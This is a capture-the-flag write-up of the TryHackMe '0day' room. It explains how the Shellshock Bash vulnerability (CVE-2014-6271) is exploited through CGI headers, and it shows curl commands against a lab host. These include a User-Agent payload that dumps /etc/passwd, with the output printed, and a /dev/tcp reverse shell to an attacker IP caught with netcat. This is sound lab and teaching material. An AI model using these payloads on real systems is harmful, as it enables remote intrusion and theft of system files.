# thm: 0day Shellshock CVE-2014–6271

https://tryhackme.com/room/0day

## Background

- Shellshock: also known as Bashdoor, refers to a set of security vulnerabilities in the Unix Bash shell that were first publicly disclosed on 24 September 2014. 

  It enabled remote code execution on vulnerable Apache web servers. The risk was especially severe when the vulnerability was triggered via CGI scripts on Apache, as this allowed attackers to execute arbitrary commands remotely.

```
() { :; }; <payload>
```

- CGI: Before PHP, Django, Node, or whatever, servers used CGI which stands for **Common Gateway Interface**. it's simply a standard way for a web server to run external scripts or binary, and use their output as the HTTP response. 

  `cgi-bin` is a directory on a web server where executable CGI scripts are stored, and when a client requests a file from it, the server runs and sends the script’s output back to the browser.

- Environment variable: When a program runs on Linux, it starts with a set of key–value pairs called environment variables which programs can read them and the shell also uses them. 

  For exmpale it looks like:

```
HOME=/home/user
PATH=/usr/bin:/bin
LANG=en_US.UTF-8
```

## Analysis

So what was the problem? Short answer: **Bash itself**

Specifically how bash handled **environment variables that contained function definitions**. 

Bash had a feature which user could export functions via environment variables and when combined with CGI, this became remotely exploitable. This is local behavior, but when combined with CGI-based web applications, it became remotely exploitable.

In a typical Apache, CGI setup, lets say a user sends HTTP request to Apache web server and if the url points to a CGI (say `/cgi-bin/test.cgi`), then the server will spawns a new process(say `/usr/bin/bash /var/www/cgi-bin/test.cgi`), and passes request info to that process via environment variables. 

so like for exmaple: 

```
REQUEST_METHOD=GET
QUERY_STRING=...
REMOTE_ADDR=1.2.3.4
HTTP_<UPPERCASE_HEADER_NAME>=
HTTP_USER_AGENT=
```

Bash reads those env vars on startup

```
HTTP_USER_AGENT="whatever the user sent" \
/usr/bin/bash /var/www/cgi-bin/test.cgi
```

But if a header value starts with `() {`, older versions of bash treats it as a function and continue executing any trailing commands after the function body.

So the header:
```
User-Agent: () { :; }; /bin/bash -c 'id'
```
turns into the env var:
```
HTTP_USER_AGENT="() { :; }; /bin/bash -c 'id'"
```
This leads directly to remote code execution.
```
HTTP_USER_AGENT () { :; }; /bin/bash -c 'id'
```
For exmaple, attacker could send a reverse shell like this:
```
GET /cgi-bin/status HTTP/1.1
Host: victim.com
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker IP>/<attacker PORT> 0>&1
```

If the CGI handler exported User-Agent into an env var and called Bash, Bash would execute the payload after `};`.

## PoC

tty0:
```
$ curl -v http://10.65.181.66/cgi-bin/test.cgi
* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
*   Trying 10.65.181.66:80...
* Connected to 10.65.181.66 (10.65.181.66) port 80 (#0)
> GET /cgi-bin/test.cgi HTTP/1.1
> Host: 10.65.181.66
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 24 Nov 2025 13:01:00 GMT
< Server: Apache/2.4.7 (Ubuntu)
< Content-Length: 13
< Content-Type: text/html
< 
Hello World!
* Connection #0 to host 10.65.181.66 left intact
$ curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd' http://10.65.181.66/cgi-bin/test.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin]
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker IP>/4444 0>&1' http://10.65.181.66/cgi-bin/test.cgi

```

tty1:
```
$ rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.65.181.66 36904
bash: cannot set terminal process group (867): Inappropriate ioctl for device
bash: no job control in this shell
id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/usr/lib/cgi-bin$ 
```
